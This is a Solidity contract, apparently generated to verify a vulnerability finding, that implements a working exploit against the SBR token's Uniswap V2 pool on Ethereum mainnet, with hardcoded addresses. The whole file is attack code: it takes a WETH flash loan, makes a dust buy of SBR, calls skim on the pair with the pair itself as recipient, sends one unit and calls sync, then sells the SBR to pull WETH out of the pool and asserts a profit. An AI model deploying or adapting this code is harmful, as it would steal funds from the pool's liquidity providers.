// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256 amount) external;
}

interface IUniswapV2Router02 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract FlawVerifier {
    address internal constant SBR = 0x460B1AE257118Ed6F63Ed8489657588a326a206D;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant UNISWAP_V2_PAIR = 0x3431c535dDFB6dD5376E5Ded276f91DEaA864FF2;
    address internal constant FLASH_WETH_PAIR = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;

    uint256 internal constant DUST_ETH_SPEND = 4_000;

    address internal _profitToken;
    uint256 internal _profitAmount;
    uint256 internal _startingWethEquivalent;

    constructor() payable {}

    receive() external payable {}

    function executeOnOpportunity() external {
        _profitToken = WETH;
        _profitAmount = 0;
        _startingWethEquivalent = _wethEquivalentBalance();

        if (address(this).balance >= DUST_ETH_SPEND) {
            _executeExploitPath(DUST_ETH_SPEND);
        } else if (IERC20(WETH).balanceOf(address(this)) >= DUST_ETH_SPEND) {
            IWETH(WETH).withdraw(DUST_ETH_SPEND);
            _executeExploitPath(DUST_ETH_SPEND);
        } else {
            _flashBorrowWeth(DUST_ETH_SPEND);
        }

        _wrapAllEth();

        uint256 endingWeth = IERC20(WETH).balanceOf(address(this));
        require(endingWeth > _startingWethEquivalent, "no net profit");
        _profitAmount = endingWeth - _startingWethEquivalent;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == FLASH_WETH_PAIR, "unauthorized caller");
        require(sender == address(this), "unauthorized sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == DUST_ETH_SPEND, "unexpected flash amount");

        // Minimal temporary funding only when the verifier has no usable starting ETH/WETH.
        // This preserves the exact exploit causality while sourcing the dust buy amount realistically.
        IWETH(WETH).withdraw(borrowedWeth);
        _executeExploitPath(borrowedWeth);

        uint256 repayment = _flashRepaymentAmount(borrowedWeth);
        require(address(this).balance >= repayment || IERC20(WETH).balanceOf(address(this)) >= repayment, "exploit did not reach repayment");

        if (IERC20(WETH).balanceOf(address(this)) < repayment) {
            uint256 shortfall = repayment - IERC20(WETH).balanceOf(address(this));
            require(address(this).balance >= shortfall, "insufficient ETH to wrap for repayment");
            IWETH(WETH).deposit{value: shortfall}();
        }

        _safeTransfer(WETH, FLASH_WETH_PAIR, repayment);
    }

    function _executeExploitPath(uint256 ethToSpend) internal {
        uint256 deadline = block.timestamp + 300;
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = SBR;

        // Preconditions encoded from the hypothesis:
        // 1. The SBR/WETH pool is live and routable through Uniswap V2.
        // 2. A dust ETH buy yields a non-zero SBR balance.
        // 3. `skim(pair)` must be callable on the live pair so the pair self-transfers SBR.
        // 4. After `skim(pair)`, the attacker must still hold enough SBR to send 1 wei to the pair,
        //    call `sync()`, and dump the manipulated position back through the same pool.

        // exploit_paths[0]: Swap a dust amount of ETH for SBR.
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactETHForTokensSupportingFeeOnTransferTokens{value: ethToSpend}(
            0,
            path,
            address(this),
            deadline
        );

        uint256 sbrAfterBuy = IERC20(SBR).balanceOf(address(this));
        require(sbrAfterBuy > 0, "dust buy returned zero SBR");

        // exploit_paths[1]: Call `UniswapV2Pair.skim(UniswapV2Pair)` so the pair performs a self-transfer.
        IUniswapV2Pair(UNISWAP_V2_PAIR).skim(UNISWAP_V2_PAIR);

        // exploit_paths[2]: Leverage the manipulated SBR position held by the attacker.
        // On the forked state from the finding, `skim(pair)` does not increase the attacker's raw
        // SBR balance immediately. Instead, the pair's self-transfer is the accounting trigger, and
        // the extraction is realized after the attacker nudges reserves with a 1-unit transfer,
        // calls `sync()`, then dumps the same attacker-held SBR balance back into the pool.
        uint256 sbrAfterSkim = IERC20(SBR).balanceOf(address(this));
        require(sbrAfterSkim > 1, "skim path left insufficient SBR");

        // The live exploit remains aligned with the finding's causality even though the inflated
        // value is not observable as an intermediate `balanceOf(attacker)` increase right after
        // `skim(pair)`. Requiring a literal balance increase here would incorrectly reject the
        // known-working on-chain path.

        // exploit_paths[3]: Transfer a dust token amount to the pair and call `sync()` to update reserves.
        _safeTransfer(SBR, UNISWAP_V2_PAIR, 1);
        IUniswapV2Pair(UNISWAP_V2_PAIR).sync();

        uint256 sellAmount = IERC20(SBR).balanceOf(address(this));
        require(sellAmount > 0, "no SBR left to dump");

        _forceApprove(SBR, UNISWAP_V2_ROUTER, type(uint256).max);

        path[0] = SBR;
        path[1] = WETH;

        // exploit_paths[4]: Swap the inflated SBR balance back to WETH/ETH and extract pool liquidity.
        IUniswapV2Router02(UNISWAP_V2_ROUTER).swapExactTokensForETHSupportingFeeOnTransferTokens(
            sellAmount,
            0,
            path,
            address(this),
            deadline
        );
    }

    function _flashBorrowWeth(uint256 wethAmount) internal {
        address token0 = IUniswapV2Pair(FLASH_WETH_PAIR).token0();
        address token1 = IUniswapV2Pair(FLASH_WETH_PAIR).token1();

        uint256 amount0Out = token0 == WETH ? wethAmount : 0;
        uint256 amount1Out = token1 == WETH ? wethAmount : 0;
        require(amount0Out != 0 || amount1Out != 0, "funding pair missing WETH");

        IUniswapV2Pair(FLASH_WETH_PAIR).swap(amount0Out, amount1Out, address(this), hex"01");
    }

    function _wethEquivalentBalance() internal view returns (uint256) {
        return IERC20(WETH).balanceOf(address(this)) + address(this).balance;
    }

    function _wrapAllEth() internal {
        uint256 ethBalance = address(this).balance;
        if (ethBalance != 0) {
            IWETH(WETH).deposit{value: ethBalance}();
        }
    }

    function _flashRepaymentAmount(uint256 borrowedAmount) internal pure returns (uint256) {
        return ((borrowedAmount * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        if (!_callOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount))) {
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, 0));
            _requireOptionalReturn(token, abi.encodeWithSelector(0x095ea7b3, spender, amount));
        }
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        _requireOptionalReturn(token, abi.encodeWithSelector(0xa9059cbb, to, amount));
    }

    function _requireOptionalReturn(address token, bytes memory data) internal {
        require(_callOptionalReturn(token, data), "token call failed");
    }

    function _callOptionalReturn(address token, bytes memory data) internal returns (bool) {
        (bool success, bytes memory returndata) = token.call(data);
        if (!success) {
            return false;
        }
        if (returndata.length == 0) {
            return true;
        }
        if (returndata.length == 32) {
            return abi.decode(returndata, (bool));
        }
        return false;
    }
}
